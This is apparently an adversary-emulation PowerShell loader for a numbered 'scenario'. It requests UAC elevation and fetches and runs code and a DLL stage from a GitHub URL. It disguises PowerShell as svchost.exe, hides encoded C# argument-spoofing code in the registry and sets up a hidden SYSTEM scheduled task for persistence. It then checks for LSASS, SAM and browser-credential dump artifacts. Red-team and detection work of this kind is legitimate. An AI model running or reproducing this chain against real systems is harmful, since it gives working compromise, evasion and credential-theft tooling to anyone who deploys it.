param()

# -- CONFIG: set this to the raw URL of the directory containing stage.dll --
#   i.e. the 'github/' folder uploaded to your repo (see Makefile sync target)
#   Example: https://raw.githubusercontent.com/<user>/<repo>/main/scenario-01-rmm/github
$scriptBase = "https://github.com/Justanother-engineer/scenario1/raw/refs/heads/main"

# -- Elevation Gate ----------------------------------------------
$isAdmin = [Security.Principal.WindowsPrincipal]::new(
    [Security.Principal.WindowsIdentity]::GetCurrent()
).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $isAdmin) {
    Write-Host "[!] Not admin. Requesting elevation via UAC..."
    $scriptUrl = "$scriptBase/loader.ps1?t=$(Get-Date -Format 'yyyyMMddHHmmss')"
    $b64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes(
        "iex((New-Object Net.WebClient).DownloadString('$scriptUrl'))"
    ))
    Start-Process powershell -Verb RunAs -ArgumentList "-NoP -Exec Bypass -Enc $b64"
    exit
}

Write-Host "[*] Running with admin privileges. Proceeding..."
$scriptStartTime = Get-Date

# -- Logging -----------------------------------------------------
$logFile = "C:\ProgramData\loader.log"
function Write-Log($msg) {
    $parent = Split-Path $logFile -Parent
    if (-not (Test-Path $parent)) { New-Item -Path $parent -ItemType Directory -Force | Out-Null }
    "$(Get-Date -Format '[yyyy-MM-dd HH:mm:ss]') $msg" | Out-File $logFile -Append
}

Write-Log "[*] loader.ps1 started - admin=True"

# Configuration
$githubBase = $scriptBase
$stageUrl = "$githubBase/stage.dll"
$stagePath = "C:\ProgramData\Microsoft\Crypto\RSA\S-1-5-18\stage.dll"
$masqueradeSrc = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
$masqueradeDst = "C:\ProgramData\Microsoft\Windows\Caches\svchost.exe"
$regPath = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Explorer"
$regName = "App"
$taskName = "SecHealthSvc"

# Create scatter directories
Write-Log "[*] Creating scatter directories..."
try {
    New-Item -Path "C:\ProgramData\Microsoft\Crypto\RSA\S-1-5-18" -ItemType Directory -Force -ErrorAction Stop | Out-Null
    New-Item -Path "C:\ProgramData\Microsoft\Windows\Caches" -ItemType Directory -Force -ErrorAction Stop | Out-Null
    Write-Log "[+] Scatter directories created"
} catch {
    Write-Log "[-] Failed to create scatter directories: $_"
}

# 1. Download stage.dll
Write-Host "[*] Downloading stage.dll..."
Write-Log "[*] Downloading stage.dll from $stageUrl"
try {
    Invoke-WebRequest -Uri $stageUrl -OutFile $stagePath -UseBasicParsing -ErrorAction Stop
    if (Test-Path $stagePath) {
        $bytes = (Get-Item $stagePath).Length
        Write-Log "[+] stage.dll downloaded - $bytes bytes (verified)"
    } else {
        Write-Log "[-] stage.dll download FAILED: file not found after download"
    }
} catch {
    Write-Log "[-] stage.dll download FAILED: $_"
}

# 2. Masquerade PowerShell
Write-Log "[*] Masquerading PowerShell -> svchost.exe..."
try {
    Copy-Item -Path $masqueradeSrc -Destination $masqueradeDst -Force -ErrorAction Stop
    if (Test-Path $masqueradeDst) {
        $mbytes = (Get-Item $masqueradeDst).Length
        Write-Log "[+] Masquerade OK - $masqueradeDst ($mbytes bytes)"
    } else {
        Write-Log "[-] Masquerade FAILED: file not found after copy"
    }
} catch {
    Write-Log "[-] Masquerade FAILED: $_"
}

# 3. Stage C# execution wrapper in HKLM
Write-Log "[*] Encoding C# source and writing registry payload..."
$spoofBase64 = "dXNpbmcgU3lzdGVtOwp1c2luZyBTeXN0ZW0uRGlhZ25vc3RpY3M7CnVzaW5nIFN5c3RlbS5JTzsKdXNpbmcgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzOwp1c2luZyBTeXN0ZW0uVGV4dDsKdXNpbmcgU3lzdGVtLlRocmVhZGluZzsKCnB1YmxpYyBzdGF0aWMgY2xhc3MgU3Bvb2YKewogICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSwgQ2hhclNldCA9IENoYXJTZXQuVW5pY29kZSldCiAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gYm9vbCBDcmVhdGVQcm9jZXNzVygKICAgICAgICBzdHJpbmcgbHBBcHBsaWNhdGlvbk5hbWUsCiAgICAgICAgc3RyaW5nIGxwQ29tbWFuZExpbmUsCiAgICAgICAgSW50UHRyIGxwUHJvY2Vzc0F0dHJpYnV0ZXMsCiAgICAgICAgSW50UHRyIGxwVGhyZWFkQXR0cmlidXRlcywKICAgICAgICBib29sIGJJbmhlcml0SGFuZGxlcywKICAgICAgICB1aW50IGR3Q3JlYXRpb25GbGFncywKICAgICAgICBJbnRQdHIgbHBFbnZpcm9ubWVudCwKICAgICAgICBzdHJpbmcgbHBDdXJyZW50RGlyZWN0b3J5LAogICAgICAgIHJlZiBTVEFSVFVQSU5GTyBscFN0YXJ0dXBJbmZvLAogICAgICAgIG91dCBQUk9DRVNTX0lORk9STUFUSU9OIGxwUHJvY2Vzc0luZm9ybWF0aW9uKTsKCiAgICBbRGxsSW1wb3J0KCJudGRsbC5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVlKV0KICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBpbnQgTnRRdWVyeUluZm9ybWF0aW9uUHJvY2VzcygKICAgICAgICBJbnRQdHIgaFByb2Nlc3MsCiAgICAgICAgaW50IFByb2Nlc3NJbmZvcm1hdGlvbkNsYXNzLAogICAgICAgIG91dCBQUk9DRVNTX0JBU0lDX0lORk9STUFUSU9OIHBiaSwKICAgICAgICBpbnQgY2IsCiAgICAgICAgb3V0IGludCByZXR1cm5MZW5ndGgpOwoKICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIsIFNldExhc3RFcnJvciA9IHRydWUpXQogICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIGJvb2wgUmVhZFByb2Nlc3NNZW1vcnkoCiAgICAgICAgSW50UHRyIGhQcm9jZXNzLAogICAgICAgIEludFB0ciBscEJhc2VBZGRyZXNzLAogICAgICAgIFtPdXRdIGJ5dGVbXSBscEJ1ZmZlciwKICAgICAgICBpbnQgZHdTaXplLAogICAgICAgIG91dCBpbnQgbHBOdW1iZXJPZkJ5dGVzUmVhZCk7CgogICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSldCiAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gYm9vbCBXcml0ZVByb2Nlc3NNZW1vcnkoCiAgICAgICAgSW50UHRyIGhQcm9jZXNzLAogICAgICAgIEludFB0ciBscEJhc2VBZGRyZXNzLAogICAgICAgIGJ5dGVbXSBscEJ1ZmZlciwKICAgICAgICBpbnQgZHdTaXplLAogICAgICAgIG91dCBpbnQgbHBOdW1iZXJPZkJ5dGVzV3JpdHRlbik7CgogICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSldCiAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gdWludCBSZXN1bWVUaHJlYWQoSW50UHRyIGhUaHJlYWQpOwoKICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIsIFNldExhc3RFcnJvciA9IHRydWUpXQogICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIGJvb2wgQ2xvc2VIYW5kbGUoSW50UHRyIGhPYmplY3QpOwoKICAgIHByaXZhdGUgY29uc3QgdWludCBDUkVBVEVfU1VTUEVOREVEID0gMHgwMDAwMDAwNDsKICAgIHByaXZhdGUgY29uc3QgaW50IFByb2Nlc3NCYXNpY0luZm9ybWF0aW9uID0gMDsKCiAgICBbU3RydWN0TGF5b3V0KExheW91dEtpbmQuU2VxdWVudGlhbCwgQ2hhclNldCA9IENoYXJTZXQuVW5pY29kZSldCiAgICBwcml2YXRlIHN0cnVjdCBTVEFSVFVQSU5GTwogICAgewogICAgICAgIHB1YmxpYyBpbnQgY2I7CiAgICAgICAgcHVibGljIHN0cmluZyBscFJlc2VydmVkOwogICAgICAgIHB1YmxpYyBzdHJpbmcgbHBEZXNrdG9wOwogICAgICAgIHB1YmxpYyBzdHJpbmcgbHBUaXRsZTsKICAgICAgICBwdWJsaWMgaW50IGR3WDsKICAgICAgICBwdWJsaWMgaW50IGR3WTsKICAgICAgICBwdWJsaWMgaW50IGR3WFNpemU7CiAgICAgICAgcHVibGljIGludCBkd1lTaXplOwogICAgICAgIHB1YmxpYyBpbnQgZHdYQ291bnRDaGFyczsKICAgICAgICBwdWJsaWMgaW50IGR3WUNvdW50Q2hhcnM7CiAgICAgICAgcHVibGljIGludCBkd0ZpbGxBdHRyaWJ1dGU7CiAgICAgICAgcHVibGljIGludCBkd0ZsYWdzOwogICAgICAgIHB1YmxpYyBzaG9ydCB3U2hvd1dpbmRvdzsKICAgICAgICBwdWJsaWMgc2hvcnQgY2JSZXNlcnZlZDI7CiAgICAgICAgcHVibGljIEludFB0ciBscFJlc2VydmVkMjsKICAgICAgICBwdWJsaWMgSW50UHRyIGhTdGRJbnB1dDsKICAgICAgICBwdWJsaWMgSW50UHRyIGhTdGRPdXRwdXQ7CiAgICAgICAgcHVibGljIEludFB0ciBoU3RkRXJyb3I7CiAgICB9CgogICAgW1N0cnVjdExheW91dChMYXlvdXRLaW5kLlNlcXVlbnRpYWwpXQogICAgcHJpdmF0ZSBzdHJ1Y3QgUFJPQ0VTU19JTkZPUk1BVElPTgogICAgewogICAgICAgIHB1YmxpYyBJbnRQdHIgaFByb2Nlc3M7CiAgICAgICAgcHVibGljIEludFB0ciBoVGhyZWFkOwogICAgICAgIHB1YmxpYyBpbnQgZHdQcm9jZXNzSWQ7CiAgICAgICAgcHVibGljIGludCBkd1RocmVhZElkOwogICAgfQoKICAgIFtTdHJ1Y3RMYXlvdXQoTGF5b3V0S2luZC5TZXF1ZW50aWFsKV0KICAgIHByaXZhdGUgc3RydWN0IFBST0NFU1NfQkFTSUNfSU5GT1JNQVRJT04KICAgIHsKICAgICAgICBwdWJsaWMgSW50UHRyIEV4aXRTdGF0dXM7CiAgICAgICAgcHVibGljIEludFB0ciBQZWJCYXNlQWRkcmVzczsKICAgICAgICBwdWJsaWMgSW50UHRyIEFmZmluaXR5TWFzazsKICAgICAgICBwdWJsaWMgSW50UHRyIEJhc2VQcmlvcml0eTsKICAgICAgICBwdWJsaWMgSW50UHRyIFVuaXF1ZVByb2Nlc3NJZDsKICAgICAgICBwdWJsaWMgSW50UHRyIEluaGVyaXRlZEZyb21VbmlxdWVQcm9jZXNzSWQ7CiAgICB9CgogICAgcHJpdmF0ZSBjb25zdCBpbnQgQ29tbWFuZExpbmVPZmZzZXQgPSAweDcwOwoKICAgIHByaXZhdGUgc3RhdGljIHZvaWQgTG9nKHN0cmluZyBtc2cpCiAgICB7CiAgICAgICAgdHJ5CiAgICAgICAgewogICAgICAgICAgICBzdHJpbmcgbG9nUGF0aCA9IEAiQzpcUHJvZ3JhbURhdGFcbG9hZGVyLmxvZyI7CiAgICAgICAgICAgIHN0cmluZyBsaW5lID0gRGF0ZVRpbWUuTm93LlRvU3RyaW5nKCJbeXl5eS1NTS1kZCBISDptbTpzc10gIikgKyBtc2c7CiAgICAgICAgICAgIEZpbGUuQXBwZW5kQWxsVGV4dChsb2dQYXRoLCBsaW5lICsgRW52aXJvbm1lbnQuTmV3TGluZSwgRW5jb2RpbmcuVW5pY29kZSk7CiAgICAgICAgfQogICAgICAgIGNhdGNoIHsgfQogICAgfQoKICAgIHB1YmxpYyBzdGF0aWMgdm9pZCBHbygpCiAgICB7CiAgICAgICAgLy8gUEVCIGFyZy1zcG9vZiB0ZWNobmlxdWUgKFQxMDU1LjAxMik6CiAgICAgICAgLy8gICBzcG9vZmVkQ21kIC0+IHBhc3NlZCB0byBDcmVhdGVQcm9jZXNzVy4gRURSIHJlYWRzIHRoZSBQRUIgYXQgcHJvY2VzcwogICAgICAgIC8vICAgICAgICAgICAgICAgICBjcmVhdGlvbiAoa2VybmVsLXNpZGUpLCBzbyBFRFIgc2VlcyBzcG9vZmVkQ21kLgogICAgICAgIC8vICAgcmVhbENtZCAgICAtPiB3cml0dGVuIHRvIFBFQi5CdWZmZXIgd2hpbGUgdGhlIHByb2Nlc3MgaXMgc3VzcGVuZGVkLgogICAgICAgIC8vICAgICAgICAgICAgICAgICBUaGUgcHJvY2VzcyByZWFkcyB0aGUgUEVCIGF0IHN0YXJ0dXAsIHNvIHRoZSBwcm9jZXNzCiAgICAgICAgLy8gICAgICAgICAgICAgICAgIHNlZXMgcmVhbENtZC4gRURSJ3MgZWFybGllciByZWFkIGlzIG5vdCByZWZyZXNoZWQuCiAgICAgICAgLy8gUEVCLkJ1ZmZlciBpcyBhbGxvY2F0ZWQgdG8gZml0IHNwb29mZWRDbWQncyBieXRlIGxlbmd0aCwgc28gc3Bvb2ZlZENtZAogICAgICAgIC8vIE1VU1QgYmUgYXQgbGVhc3QgYXMgbG9uZyBhcyByZWFsQ21kIChpbiBjaGFycykgdG8gYXZvaWQgaGVhcCBvdmVyZmxvdy4KICAgICAgICAvLyBQYWQgc3Bvb2ZlZENtZCB3aXRoIHRyYWlsaW5nIHdoaXRlc3BhY2UgKG91dHNpZGUgdGhlIHF1b3RlZCBETEwgcGF0aCkKICAgICAgICAvLyB0byBtYXRjaCByZWFsQ21kJ3MgbGVuZ3RoOyB0aGUgdHJhaWxpbmcgY2hhcnMgYXJlIGlnbm9yZWQgYnkgcmVnc3ZyMzIncwogICAgICAgIC8vIGFyZ3YgcGFyc2VyIGFuZCBhcmUgY29zbWV0aWMgbm9pc2UgaW4gdGhlIEVEUi12aXNpYmxlIGNtZGxpbmUuCiAgICAgICAgLy8gRGVjb3kgRExMIGlzIG1zaHRtbC5kbGwgKGNhbm9uaWNhbCBUMTIxOC4wMTAgZGVjb3kpLgogICAgICAgIHN0cmluZyBzcG9vZmVkQ21kID0gInJlZ3N2cjMyLmV4ZSAvcyBcIkM6XFxXaW5kb3dzXFxTeXN0ZW0zMlxcbXNodG1sLmRsbFwiICAgICAgICAgICAgICAgICAgICAgICAgIjsKICAgICAgICBzdHJpbmcgcmVhbENtZCAgICA9ICJyZWdzdnIzMi5leGUgL3MgXCJDOlxcUHJvZ3JhbURhdGFcXE1pY3Jvc29mdFxcQ3J5cHRvXFxSU0FcXFMtMS01LTE4XFxzdGFnZS5kbGxcIiI7CgogICAgICAgIFNUQVJUVVBJTkZPIHNpID0gbmV3IFNUQVJUVVBJTkZPKCk7CiAgICAgICAgc2kuY2IgPSBNYXJzaGFsLlNpemVPZih0eXBlb2YoU1RBUlRVUElORk8pKTsKCiAgICAgICAgUFJPQ0VTU19JTkZPUk1BVElPTiBwaTsKCiAgICAgICAgTG9nKCJbKl0gQ3JlYXRpbmcgc3VzcGVuZGVkIHJlZ3N2cjMyLmV4ZS4uLiIpOwogICAgICAgIGlmICghQ3JlYXRlUHJvY2Vzc1cobnVsbCwgc3Bvb2ZlZENtZCwgSW50UHRyLlplcm8sIEludFB0ci5aZXJvLCBmYWxzZSwKICAgICAgICAgICAgQ1JFQVRFX1NVU1BFTkRFRCwgSW50UHRyLlplcm8sIG51bGwsIHJlZiBzaSwgb3V0IHBpKSkKICAgICAgICB7CiAgICAgICAgICAgIGludCBlcnIgPSBNYXJzaGFsLkdldExhc3RXaW4zMkVycm9yKCk7CiAgICAgICAgICAgIExvZygiWy1dIENyZWF0ZVByb2Nlc3NXIEZBSUxFRCAoZXJyb3IgIiArIGVyciArICIpIik7CiAgICAgICAgICAgIHJldHVybjsKICAgICAgICB9CiAgICAgICAgTG9nKCJbK10gcmVnc3ZyMzIuZXhlIGNyZWF0ZWQgKFBJRD0iICsgcGkuZHdQcm9jZXNzSWQgKyAiKSIpOwoKICAgICAgICBpbnQgcmV0TGVuOwogICAgICAgIFBST0NFU1NfQkFTSUNfSU5GT1JNQVRJT04gcGJpOwogICAgICAgIGlmIChOdFF1ZXJ5SW5mb3JtYXRpb25Qcm9jZXNzKHBpLmhQcm9jZXNzLCBQcm9jZXNzQmFzaWNJbmZvcm1hdGlvbiwKICAgICAgICAgICAgb3V0IHBiaSwgTWFyc2hhbC5TaXplT2YodHlwZW9mKFBST0NFU1NfQkFTSUNfSU5GT1JNQVRJT04pKSwKICAgICAgICAgICAgb3V0IHJldExlbikgIT0gMCkKICAgICAgICB7CiAgICAgICAgICAgIExvZygiWy1dIE50UXVlcnlJbmZvcm1hdGlvblByb2Nlc3MgRkFJTEVEIik7CiAgICAgICAgICAgIFJlc3VtZVRocmVhZChwaS5oVGhyZWFkKTsKICAgICAgICAgICAgQ2xvc2VIYW5kbGUocGkuaFByb2Nlc3MpOwogICAgICAgICAgICBDbG9zZUhhbmRsZShwaS5oVGhyZWFkKTsKICAgICAgICAgICAgcmV0dXJuOwogICAgICAgIH0KICAgICAgICBMb2coIlsrXSBQRUIgbG9jYXRlZCIpOwoKICAgICAgICBieXRlW10gcGViQnVmZmVyID0gbmV3IGJ5dGVbSW50UHRyLlNpemUgKiA1XTsKICAgICAgICBpbnQgYnl0ZXNSZWFkOwogICAgICAgIGlmICghUmVhZFByb2Nlc3NNZW1vcnkocGkuaFByb2Nlc3MsIHBiaS5QZWJCYXNlQWRkcmVzcywgcGViQnVmZmVyLCBwZWJCdWZmZXIuTGVuZ3RoLCBvdXQgYnl0ZXNSZWFkKSkKICAgICAgICB7CiAgICAgICAgICAgIExvZygiWy1dIFJlYWRQcm9jZXNzTWVtb3J5KFBFQikgRkFJTEVEIik7CiAgICAgICAgICAgIFJlc3VtZVRocmVhZChwaS5oVGhyZWFkKTsKICAgICAgICAgICAgQ2xvc2VIYW5kbGUocGkuaFByb2Nlc3MpOwogICAgICAgICAgICBDbG9zZUhhbmRsZShwaS5oVGhyZWFkKTsKICAgICAgICAgICAgcmV0dXJuOwogICAgICAgIH0KICAgICAgICBMb2coIlsrXSBQRUIgcmVhZCIpOwoKICAgICAgICBpbnQgcHBPZmZzZXQgPSBJbnRQdHIuU2l6ZSA9PSA4ID8gMHgyMCA6IDB4MTA7CiAgICAgICAgSW50UHRyIHByb2Nlc3NQYXJhbWV0ZXJzUHRyID0gTWFyc2hhbC5SZWFkSW50UHRyKHBlYkJ1ZmZlciwgcHBPZmZzZXQpOwogICAgICAgIExvZygiWytdIFByb2Nlc3NQYXJhbWV0ZXJzIHJlc29sdmVkIik7CgogICAgICAgIGJ5dGVbXSBjbWRCdWZmZXIgPSBuZXcgYnl0ZVsxNl07CiAgICAgICAgaWYgKCFSZWFkUHJvY2Vzc01lbW9yeShwaS5oUHJvY2VzcywgSW50UHRyLkFkZChwcm9jZXNzUGFyYW1ldGVyc1B0ciwgQ29tbWFuZExpbmVPZmZzZXQpLCBjbWRCdWZmZXIsIGNtZEJ1ZmZlci5MZW5ndGgsIG91dCBieXRlc1JlYWQpKQogICAgICAgIHsKICAgICAgICAgICAgTG9nKCJbLV0gUmVhZFByb2Nlc3NNZW1vcnkoY21kUHRyKSBGQUlMRUQiKTsKICAgICAgICAgICAgUmVzdW1lVGhyZWFkKHBpLmhUaHJlYWQpOwogICAgICAgICAgICBDbG9zZUhhbmRsZShwaS5oUHJvY2Vzcyk7CiAgICAgICAgICAgIENsb3NlSGFuZGxlKHBpLmhUaHJlYWQpOwogICAgICAgICAgICByZXR1cm47CiAgICAgICAgfQogICAgICAgIExvZygiWytdIENvbW1hbmQgbGluZSBwb2ludGVyIHJlYWQiKTsKCiAgICAgICAgYnl0ZVtdIG5ld0NtZEJ5dGVzID0gRW5jb2RpbmcuVW5pY29kZS5HZXRCeXRlcyhyZWFsQ21kKTsKICAgICAgICBJbnRQdHIgYnVmZmVyUHRyID0gTWFyc2hhbC5SZWFkSW50UHRyKGNtZEJ1ZmZlciwgOCk7CgogICAgICAgIGludCB3cml0dGVuOwogICAgICAgIGlmICghV3JpdGVQcm9jZXNzTWVtb3J5KHBpLmhQcm9jZXNzLCBidWZmZXJQdHIsIG5ld0NtZEJ5dGVzLCBuZXdDbWRCeXRlcy5MZW5ndGgsIG91dCB3cml0dGVuKSkKICAgICAgICB7CiAgICAgICAgICAgIExvZygiWy1dIFdyaXRlUHJvY2Vzc01lbW9yeShjbWQpIEZBSUxFRCIpOwogICAgICAgICAgICBSZXN1bWVUaHJlYWQocGkuaFRocmVhZCk7CiAgICAgICAgICAgIENsb3NlSGFuZGxlKHBpLmhQcm9jZXNzKTsKICAgICAgICAgICAgQ2xvc2VIYW5kbGUocGkuaFRocmVhZCk7CiAgICAgICAgICAgIHJldHVybjsKICAgICAgICB9CiAgICAgICAgTG9nKCJbK10gQ29tbWFuZCBsaW5lIG92ZXJ3cml0dGVuOiBzdGFnZS5kbGwiKTsKCiAgICAgICAgYnl0ZVtdIGxlbmd0aEJ5dGVzID0gQml0Q29udmVydGVyLkdldEJ5dGVzKG5ld0NtZEJ5dGVzLkxlbmd0aCk7CiAgICAgICAgYnl0ZVtdIG1heExlbmd0aEJ5dGVzID0gQml0Q29udmVydGVyLkdldEJ5dGVzKG5ld0NtZEJ5dGVzLkxlbmd0aCk7CiAgICAgICAgQnVmZmVyLkJsb2NrQ29weShsZW5ndGhCeXRlcywgMCwgY21kQnVmZmVyLCAwLCAyKTsKICAgICAgICBCdWZmZXIuQmxvY2tDb3B5KG1heExlbmd0aEJ5dGVzLCAwLCBjbWRCdWZmZXIsIDIsIDIpOwogICAgICAgIFdyaXRlUHJvY2Vzc01lbW9yeShwaS5oUHJvY2VzcywgSW50UHRyLkFkZChwcm9jZXNzUGFyYW1ldGVyc1B0ciwgQ29tbWFuZExpbmVPZmZzZXQpLCBjbWRCdWZmZXIsIGNtZEJ1ZmZlci5MZW5ndGgsIG91dCB3cml0dGVuKTsKICAgICAgICBMb2coIlsrXSBDb21tYW5kIGxpbmUgbGVuZ3RoIHVwZGF0ZWQiKTsKCiAgICAgICAgTG9nKCJbKl0gUmVzdW1pbmcgcmVnc3ZyMzIuZXhlIHRocmVhZC4uLiIpOwogICAgICAgIFJlc3VtZVRocmVhZChwaS5oVGhyZWFkKTsKICAgICAgICBDbG9zZUhhbmRsZShwaS5oUHJvY2Vzcyk7CiAgICAgICAgQ2xvc2VIYW5kbGUocGkuaFRocmVhZCk7CiAgICAgICAgLy8gcG9ueXRhaWw6IHJlZ3N2cjMyLmV4ZSAvcyBleGl0cyBjbGVhbmx5IHdoZXRoZXIgRGxsUmVnaXN0ZXJTZXJ2ZXIgc3VjY2VlZHMKICAgICAgICAvLyBvciBub3QsIHNvIGFuIGFsaXZlLWNoZWNrIGlzIGEgZmFsc2UtbmVnYXRpdmUuIExvYWRlciBwb2xscyBmb3IgcG9zdC1leAogICAgICAgIC8vIGFydGlmYWN0cyAoTG9hZGVyTG9nIGVudHJpZXMgZnJvbSBXb3JrZXJUaHJlYWQpIGluc3RlYWQuCiAgICAgICAgTG9nKCJbK10gcmVnc3ZyMzIuZXhlIHJlc3VtZWQsIGFyZ3VtZW50IHNwb29maW5nIGNvbXBsZXRlIik7CiAgICB9Cn0K"
$spoofBytes = [Convert]::FromBase64String($spoofBase64)
$spoofSource = [Text.Encoding]::UTF8.GetString($spoofBytes)

# Wrap C# in Add-Type so iex will compile + call it
$regValue = @"
function Get-Ts { [DateTime]::Now.ToString('[yyyy-MM-dd HH:mm:ss]') }

"`$(Get-Ts) [*] Task payload executing (svchost.exe)" | Out-File C:\ProgramData\loader.log -Append
try {
    "`$(Get-Ts) [*] Compiling C# (Add-Type)..." | Out-File C:\ProgramData\loader.log -Append
    Add-Type -TypeDefinition @'
$spoofSource
'@ -Language CSharp
    "`$(Get-Ts) [+] C# compiled successfully, calling Spoof::Go()" | Out-File C:\ProgramData\loader.log -Append
    [Spoof]::Go()
    "`$(Get-Ts) [+] Spoof::Go() completed" | Out-File C:\ProgramData\loader.log -Append
} catch {
    "`$(Get-Ts) [-] Task payload FAILED: `$_" | Out-File C:\ProgramData\loader.log -Append
    "`$(Get-Ts) [-] Type: `$(`$_.Exception.GetType().FullName)" | Out-File C:\ProgramData\loader.log -Append
}
"@

if (-not (Test-Path $regPath)) {
    New-Item -Path $regPath -Force | Out-Null
}
Set-ItemProperty -Path $regPath -Name $regName -Value $regValue -Force
$checkVal = (Get-ItemProperty -Path $regPath -Name $regName -ErrorAction SilentlyContinue).$regName
if ($checkVal) {
    Write-Log "[+] Registry payload stored at $regPath\$regName - $($checkVal.Length) chars (verified)"
} else {
    Write-Log "[-] Registry payload FAILED"
}

# 4. Create scheduled task with dynamic time via Register-ScheduledTask
Write-Log "[*] Creating scheduled task (Register-ScheduledTask)..."
$b64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes(
    "iex(gp '$regPath').$regName"
))
$action = New-ScheduledTaskAction -Execute $masqueradeDst -Argument "-NoP -Enc $b64"
$trigger = New-ScheduledTaskTrigger -AtStartup
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -Hidden -ExecutionTimeLimit ([TimeSpan]::FromMinutes(5))
try {
    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force -ErrorAction Stop
    $verify = Get-ScheduledTask -TaskName $taskName -ErrorAction Stop
    Write-Log "[+] Task $taskName created - state=$($verify.State) action=$($verify.Actions.Execute) trigger=AtStartup"
    Write-Host "[+] Scheduled. Triggering immediate run + AtStartup persistence..."
    Start-ScheduledTask -TaskName $taskName
    Start-Sleep -Seconds 2
    $info = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
    if ($info -and $info.State -ne 'Ready') {
        Write-Log "[+] Task $taskName triggered (state=$($info.State))"
    } elseif ($info) {
        Write-Log "[*] Task $taskName state=Ready after trigger (last run may have already completed)"
    }
} catch {
    Write-Log "[-] Task creation FAILED`n$_"
}

# 5. Wait for post-ex artifacts (chain runs in <30s, wait 180s for safety)
Write-Log "[*] Task $taskName triggered, waiting 180s for post-ex artifacts..."
Start-Sleep -Seconds 180

# 6. Execution Report — confirms every technique/artifact from the kill chain
$elapsed = [DateTime]::Now - $scriptStartTime
Write-Log "=========================="
Write-Log " SCENARIO 01 EXECUTION REPORT"
Write-Log "=========================="
Write-Log "Elapsed: $($elapsed.TotalSeconds.ToString('F1'))s"

# ponytail: one helper that handles files (returns size), reg keys, and user accounts
function Check-Artifact($tid, $desc, $path) {
    if ($path -like 'USER:*') {
        $name = $path.Substring(5)
        return @{TID=$tid; Desc=$desc; Path=$path; Found=((net user $name 2>$null) -match "^$name\b")}
    }
    if ($path -match '^HKLM:') {
        $leaf = Split-Path $path -Leaf
        $parent = Split-Path $path -Parent
        if (-not $parent) { return @{TID=$tid; Desc=$desc; Path=$path; Found=$false} }
        $val = Get-ItemProperty -Path $parent -Name $leaf -ErrorAction SilentlyContinue
        return @{TID=$tid; Desc=$desc; Path=$path; Found=[bool]$val}
    }
    if ($path -like 'GLOB:*') {
        $glob = $path.Substring(5)
        $found = [bool](Get-ChildItem (Split-Path $glob) -Filter (Split-Path $glob -Leaf) -ErrorAction SilentlyContinue)
        return @{TID=$tid; Desc=$desc; Path=$path; Found=$found}
    }
    if ($path -like 'LOG:*') {
        $pat = $path.Substring(4)
        $log = Get-Content $logFile -Raw -ErrorAction SilentlyContinue
        return @{TID=$tid; Desc=$desc; Path="(log)"; Found=($log -match $pat)}
    }
    $found = Test-Path $path
    if ($found) {
        $size = (Get-Item $path -ErrorAction SilentlyContinue).Length
        return @{TID=$tid; Desc=$desc; Path=$path; Found=$true; Size=$size}
    }
    return @{TID=$tid; Desc=$desc; Path=$path; Found=$false}
}

$results = @()

# Phase 2 — loader.ps1 artifacts
$results += Check-Artifact "T1105"     "stage.dll downloaded"   "C:\ProgramData\Microsoft\Crypto\RSA\S-1-5-18\stage.dll"
$results += Check-Artifact "T1036.003" "PS masqueraded"         "C:\ProgramData\Microsoft\Windows\Caches\svchost.exe"
$results += Check-Artifact "T1059.001" "Registry C# payload"    "HKLM:\Software\Microsoft\Windows\CurrentVersion\Explorer\App"
$results += Check-Artifact "T1053.005" "SYSTEM scheduled task"  "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\SecHealthSvc"

# Phase 3 — PEB argument spoofing (log evidence: spoof.cs writes to loader.log)
$results += Check-Artifact "T1055.012" "Arg spoofing"           "LOG:Command line overwritten"
$results += Check-Artifact "T1218.010" "regsvr32 LOLBin load"   "LOG:DllRegisterServer called"

# Phase 4 — APC injection (log evidence from stage.c)
$results += Check-Artifact "T1055.004" "APC injection"          "LOG:InjectAPC.*queued"

# Phase 5 — Post-exploitation in svchost.exe
$results += Check-Artifact "T1115"     "Clipboard monitor"      "C:\ProgramData\Microsoft\Network\~clip.tmp"
$results += Check-Artifact "T1003.001" "LSASS dump"             "C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys\~adf.bin"
$results += Check-Artifact "T1003.002" "SAM hive dump"          "C:\Windows\Temp\~s1.tmp"
$results += Check-Artifact "T1003.002" "SYSTEM hive dump"       "C:\Windows\Temp\~s2.tmp"
$results += Check-Artifact "T1555.003" "Browser creds"          "GLOB:C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys\~br_*.tmp"
$results += Check-Artifact "T1217"     "Browser info discovery" "GLOB:C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys\~br_*.tmp"
$results += Check-Artifact "T1082"     "System info recon"      "C:\ProgramData\Microsoft\Network\~df.tmp"
$results += Check-Artifact "T1057"     "Process list"           "C:\ProgramData\Microsoft\Network\~df.tmp"
